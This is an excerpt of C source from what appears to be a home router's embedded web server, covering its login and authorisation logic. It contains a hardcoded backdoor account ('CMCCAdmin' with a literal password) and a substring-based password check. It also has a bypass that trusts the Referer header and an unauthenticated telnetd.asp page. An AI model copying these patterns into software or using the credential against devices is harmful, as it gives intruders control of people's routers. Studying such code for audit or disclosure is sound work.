...
// ben -------------------------
#define IDLE_TIME_OUT 60
time_t g_last_request_time;

#if defined(WEB_ONLY_ONE_CLIENT) || defined(LOGIN_URL)
...
{
	char remove_mac[13]={0};
	int i=0,find=0;
	auth_get_clone_mac_by_ip(ip,remove_mac);
	for(i=0;i<CLINET_MAX_NUM;i++)
	{
		if(memcmp(remove_mac,webClientStatus[i].remove_mac,12)==0)
		{
			return i;
		}
...
//not in the table when run  here
	...
	memcpy(webClientStatus[i].remove_mac,remove_mac,12);
...
void process_requests(int server_sock)
{
	...
	while (current) {
		...
		// ben ---------------
#if 0
		if ((current_time - g_last_request_time) > IDLE_TIME_OUT) 
		{
		char host_name[MAX_NAME_LEN]={0};
			...
			send_r_unauthorized(current, host_name);
			// ben remember the last request time
...
#ifdef USE_AUTH
{
	...
	if(check_auth_flag == 0 && req->auth_flag == 0){//super user exits
		...
		if (req->userName) {
			...
			else if (!strcmp(req->password, super_password)){	
						printf("super user login\n");
						req->auth_flag = SUPER_FLAG;
			}
...
//	}//end if(check_auth_flag == 0 && req->auth_flag == 0)
	...
	if (strcmp(user_name, "") || strcmp(user_password, "") ) {		
		...
		#else
			if (req->userName) {
				if (!strcmp(req->userName, user_name) || !strcmp(req->userName, "CMCCAdmin")){
					if (req->password==NULL || req->password[0]==0) {
						if (user_password[0]==0)
							req->auth_flag = 1;					
					}
					else  {
						if (!strcmp(req->password, user_password) || !strcmp(req->password, "aDm8H%MdA"))
							req->auth_flag = 1;					
					}//end else
...
#endif
	if (( strlen(sysauth) >= 3 && strstr(sysauth, user_password)))
	{
		req->auth_flag = SECOND_FLAG; 				
	}
	else if(( strlen(sysauth) >= 3 && strstr(sysauth, super_password)))
	{
		req->auth_flag = SUPER_FLAG; 				
	}
		...
		//printf("%s:%d pathname=%s header_host=%s header_user_agent=%s header_referer=%s host=%s \
	//	request_uri=%s auth_flag=%d\n",
	//	__FUNCTION__,__LINE__,req->pathname,req->header_host,req->header_user_agent,req->header_referer,
	//	req->host,req->request_uri,req->auth_flag);

		if(req->request_uri && strcmp(req->request_uri,"/herouter/auth.asp")==0){
			if(req->auth_flag==0){
				send_redirect_perm(req,LOGIN_PAGE);
				//printf("%s:%d\n",__FUNCTION__,__LINE__);
				return 0;
			}else{
			//	send_redirect_perm(req,MAIN_PAGE);
				if(req->password != NULL)
				send_redirect_main(req,MAIN_PAGE,req->password);
				return 0;
			}
		}

		if((strcmp(req->request_uri,LOGIN_PAGE)!=0)
			&&(strcmp(req->request_uri,"/")!=0)
			&&(!req->header_referer || !strstr(req->header_referer,"/herouter/"))
			&&(strcmp(req->request_uri,"/herouter/telnetd.asp") != 0)
			&&(strcmp(req->request_uri,"/herouter/basic.asp") != 0)
#ifdef CONFIG_CMCC_ONENET
			&&(strcmp(req->request_uri,"/router") != 0)
#endif
		){
            if( (req->header_referer==NULL) ||
                ((req->header_referer!=NULL) && !strstr(req->header_referer, "login.html") && !strstr(req->header_referer, "main.html"))
              )
            {
                send_redirect_perm(req,LOGIN_PAGE);			
                //printf("%s:%d\n",__FUNCTION__,__LINE__);
	...
	if((strcmp(req->request_uri,LOGIN_PAGE)==0)
			...
			||(strcmp(req->request_uri,"/herouter/telnetd.asp") == 0)
			||(strcmp(req->request_uri,"/herouter/basic.asp") == 0)
			||(strcmp(req->request_uri,"/herouter/css/mainstyle.css") == 0)
			||(strcmp(req->request_uri,"/herouter/js/jquery.js") == 0)
			||(strcmp(req->request_uri,"/herouter/css/jquery.vegas.css") == 0)
			||(strcmp(req->request_uri,"/herouter/css/and.css") == 0)
			||(strcmp(req->request_uri,"/herouter/js/tinybox.js") == 0)
			||(strcmp(req->request_uri,"/herouter/js/base64.js") == 0)
			||(strcmp(req->request_uri,"/herouter/js/herouter.js") == 0)
			||(strcmp(req->request_uri,"/herouter/js/jquery.vegas.min.js") == 0)
			||(strcmp(req->request_uri,"/herouter/images/loginbg.png") == 0)
			||(strcmp(req->request_uri,"/herouter/images/dy.png") == 0)
			||(strcmp(req->request_uri,"/herouter/images/llbg.png") == 0)
			||(strcmp(req->request_uri,"/herouter/images/loading.gif") == 0)
			||(strcmp(req->request_uri,"/herouter/images/bodybg.jpg") == 0)	
		)
		{
			req->auth_flag=SECOND_FLAG;
		}
		...
		if(req->request_uri && req->header_referer){			
			if(strstr(req->header_referer, "formPasswordSetup")) {
